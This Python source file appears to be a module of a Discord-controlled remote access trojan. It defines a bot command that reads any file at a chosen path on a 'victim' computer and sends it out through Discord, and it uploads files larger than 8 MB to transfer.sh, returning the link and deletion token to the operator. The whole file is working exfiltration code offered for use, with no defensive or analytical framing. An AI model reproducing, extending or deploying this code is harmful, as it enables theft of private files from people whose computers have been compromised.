import disnake as discord
from disnake.ext import commands
from datetime import datetime

import os
import requests


class ReceiveFiles(commands.Cog):
    def __init__(self, bot: commands.Bot):
        self.bot = bot

    @commands.slash_command()
    async def file_download(self, ctx, victim, file_path):
        """Receives file from victim's PC.

        Parameters
        ----------
        victim: Identifier of the affected computer (found via /listvictims).
        file_path: Path of the file for receiving.
        """
        if self.bot.valid(victim):
            await ctx.response.defer()

            if '"' in file_path:
                file_path = file_path.replace('"', "")
            try:
                file_size = os.path.getsize(file_path)
            except OSError:
                return await ctx.followup.send(
                    embed=self.bot.genEmbed(
                        "File was not found!",
                        datetime.now(),
                        "Please specify a different path and try again",
                    )
                )

            if file_size < 8388608:
                try:
                    with open(file_path, "rb") as f:
                        return await ctx.followup.send(
                            embed=self.bot.genEmbed(
                                "Received file from victim", datetime.now()
                            ),
                            file=discord.File(
                                f, os.path.basename(file_path)
                            ),
                        )
                except OSError:
                    return await ctx.followup.send(
                        embed=self.bot.genEmbed(
                            "File was not found!",
                            datetime.now(),
                            "Please specify a different path and try again",
                        )
                    )

            try:
                with open(file_path, "rb") as f:
                    file = {"{}".format(file_path): f}
                    response = requests.post(
                        "https://transfer.sh/", files=file
                    )
                download_link = response.content.decode("utf-8")
                deletion_token = response.headers.get("X-Url-Delete")

                deletion_token = deletion_token.replace(
                    download_link.rstrip() + "/", ""
                )

                await ctx.followup.send(
                    embed=self.bot.genEmbed(
                        "Received file from victim",
                        datetime.now(),
                        "Link:\n"
                        + download_link
                        + "\nDeletion token:\n"
                        + deletion_token,
                    )
                )
            except OSError:
                await ctx.followup.send(
                    embed=self.bot.genEmbed(
                        "File was not found!",
                        datetime.now(),
                        "Please specify a different path and try again",
                    )
                )


def setup(bot: commands.Bot):
    bot.add_cog(ReceiveFiles(bot))
